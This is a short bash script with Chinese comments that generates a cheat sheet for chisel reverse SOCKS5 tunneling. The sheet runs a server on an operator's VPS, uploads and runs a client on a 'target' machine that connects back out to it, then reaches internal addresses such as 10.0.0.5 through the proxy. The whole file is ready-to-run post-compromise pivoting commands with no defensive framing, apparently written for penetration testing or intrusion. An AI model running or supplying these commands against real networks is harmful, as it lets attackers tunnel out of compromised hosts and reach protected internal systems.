#!/usr/bin/env bash
VPS="${1:?usage: bash chisel.sh <VPS> [port]}"
PORT="${2:-8080}"
cat > runs/chisel.md <<EOF
# 1) VPS（服务端，开反向 socks）
./chisel server -p $PORT --reverse --socks5

# 2) 目标（上传 chisel 可执行文件）
chmod +x chisel && ./chisel client $VPS:$PORT R:socks
#   指定认证: ./chisel server -p $PORT --reverse --socks5 --auth rt:pass
#             ./chisel client --auth rt:pass $VPS:$PORT R:socks

# 3) 验证（本地 1080 就是 socks5）
curl -sS --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -o /dev/null -w '%{http_code}\n'
proxychains4 -f runs/pc-chisel.conf curl -s http://10.0.0.5/
EOF
cat runs/chisel.md
